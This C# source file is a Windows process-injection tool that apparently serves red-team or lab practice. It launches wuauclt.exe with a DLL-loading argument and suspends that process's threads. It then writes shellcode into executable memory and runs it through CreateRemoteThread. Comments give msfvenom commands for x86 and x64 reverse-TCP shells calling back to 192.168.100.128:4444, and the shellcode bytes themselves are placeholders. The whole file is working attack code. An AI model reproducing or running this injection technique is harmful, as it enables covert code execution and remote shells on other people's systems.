﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;


namespace Inject
{
    class Program
    {
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);

        static void Main(string[] args)
        {
            byte[] buf;
            IntPtr hProcess = default;

            ProcessStartInfo startInfo = new ProcessStartInfo("wuauclt.exe");
            startInfo.Arguments = "/UpdateDeploymentProvider aadauthhelper.dll /RunHandlerComServer";
            Process.Start(startInfo);

            Process[] procName = Process.GetProcessesByName("wuauclt");
            int processID = 0;
            bool processArch = false;
            foreach (Process process in procName)
            {
                //Open remote process
                processID = process.Id;
                hProcess = OpenProcess(0x001F0FFF, false, process.Id);
                IsWow64Process(hProcess, out processArch);

                foreach (ProcessThread thread in process.Threads)
                {
                    IntPtr pThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)thread.Id);

                    if (pThread == IntPtr.Zero)
                    {
                        continue;
                    }

                    SuspendThread(pThread);

                    CloseHandle(pThread);
                }

            }
        
            //Allocate space
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            var allocAddress = string.Format("{0:X}", addr); // Pointer -> String
            UInt64 number = UInt64.Parse(allocAddress); // String -> Int
            string allocAddressHex = number.ToString("x"); // Int -> Hex
            Console.WriteLine("Executable Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);


            // x86 Payload: msfvenom -p windows/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] bufx86 = new byte[<BYTES>] { <SHELLCODE_X86> };

            // x64 Payload: msfvenom -p windows/x64/shell_reverse_tcp exitfunc=thread LHOST=192.168.100.128 LPORT=4444 -f csharp
            byte[] bufx64 = new byte[<BYTES>] { <SHELLCODE_X64> };

            if (processArch == true)
            {
                //Injected process is x86
                buf = bufx86;
                Console.WriteLine("Shellcode injected to x86 process.");
            }
            else
            {
                //Injected process is x64
                buf = bufx64;
                Console.WriteLine("Shellcode injected to x64 process.");

            }

            unsafe
            {
                fixed (byte* p = &buf[0])
                {
                    byte* p2 = p;
                    // https://stackoverflow.com/questions/2057469/how-can-i-display-a-pointer-address-in-c
                    //string bufAddress = string.Format("0x{0:X}", new IntPtr(p2));

                    //Convert DEC->HEX
                    var bufString = string.Format("{0:X}", new IntPtr(p2)); //Pointer -> String (DEC) format.
                    UInt64 bufInt = UInt64.Parse(bufString); //String -> Integer
                    string bufHex = bufInt.ToString("x"); //Integer -> Hex

                    Console.WriteLine("Payload Address on this executable: " + "0x" + bufHex);

                }
            }
            Console.WriteLine("1st breakpoint. Press Enter to continue ...");
            Console.ReadLine();
            IntPtr outSize;

            //Write to remote process
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            Console.WriteLine("Payload has been written to the buffer!");
            Console.WriteLine("2st breakpoint. Press Enter to continue ...");
            Console.ReadLine();

            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            //Enumerate threads from the given process.
            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }

            }
        }
    }
}